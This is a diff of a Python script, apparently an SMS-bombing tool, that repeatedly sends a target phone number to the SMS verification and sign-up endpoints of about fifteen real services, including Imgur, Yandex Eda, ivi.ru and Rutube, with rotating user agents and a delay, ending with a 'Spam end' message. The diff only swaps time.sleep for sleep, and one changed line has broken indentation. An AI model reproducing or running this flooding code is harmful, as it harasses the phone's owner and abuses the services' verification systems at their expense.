@@ -1,5 +1,5 @@
 import requests
-import time
+from time import sleep
 from os import system
 from user_agent import generate_user_agent
 from colorama import Fore, Style
@@ -49,51 +49,51 @@ for i in range(count):
 
     print(a)
 
-    time.sleep(delay)
+    sleep(delay)
 
 
     b = requests.post("https://bamper.by/registration/?step=1", data={"phone": "+" + number, "submit": "Запросить смс подтверждения", "rules": "on"}, headers=headers)
 
     print(b)
 
-    time.sleep(delay)
+    sleep(delay)
 
 
     c = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": number}, headers=headers)
 
     print(c)
 
-    time.sleep(delay)
+   sleep(delay)
 
     d = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", headers=headers, json={"phone_number": "+" + number})
 
     print(d)
 
-    time.sleep(delay)
+    sleep(delay)
 
     e = requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": number}, headers=headers)
 
     print(e)
 
-    time.sleep(delay)
+    sleep(delay)
 
     g = requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": number}, headers=headers)
 
     print(g)
 
-    time.sleep(delay)
+    sleep(delay)
 
     h = requests.post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": number, "region_code": "RU"}, headers=headers)
 
     print(h)
 
-    time.sleep(delay)
+    sleep(delay)
 
     k = requests.post("https://thehive.pro/auth/signup", json={"phone": "+" + number}, headers=headers)
 
     print(k)
 
-    time.sleep(delay)
+    sleep(delay)
 
     j = requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": number}, headers=headers)
     print(j)
@@ -102,7 +102,7 @@ for i in range(count):
 
     print(l)
 
-    time.sleep(delay)
+    sleep(delay)
 
     m = requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/", json={"phone": "+" + number}, headers=headers)
 
@@ -112,18 +112,18 @@ for i in range(count):
 
     print(n)
 
-    time.sleep(delay)
+    sleep(delay)
 
     x = requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": number}, headers=headers)
 
     print(x)
 
-    time.sleep(delay)
+    sleep(delay)
 
     z = requests.post("https://account.my.games/signup_send_sms/", data={"phone": number}, headers=headers)
 
     print(z)
 
-    time.sleep(delay)
+    sleep(delay)
 
 print("Spam end")
